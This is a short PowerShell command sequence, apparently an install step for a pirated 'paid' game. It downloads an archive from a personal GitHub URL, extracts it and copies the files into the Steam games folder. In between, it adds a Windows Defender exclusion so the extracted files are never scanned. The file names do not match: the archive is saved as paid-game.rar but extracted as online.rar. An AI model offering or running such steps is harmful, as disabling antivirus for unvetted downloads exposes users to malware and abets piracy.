wget -O ~/Downloads/paid-game.rar "https://raw.githubusercontent.com/pengux180/games/main/online.rar"
& "C:\Program Files\7-Zip\7z.exe" x "$env:USERPROFILE\Downloads\online.rar" -o"$env:USERPROFILE\Downloads\online" -y
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads\online\*"
copy "$env:USERPROFILE\Downloads\online\*" "C:\Program Files (x86)\Steam\steamapps\common\"
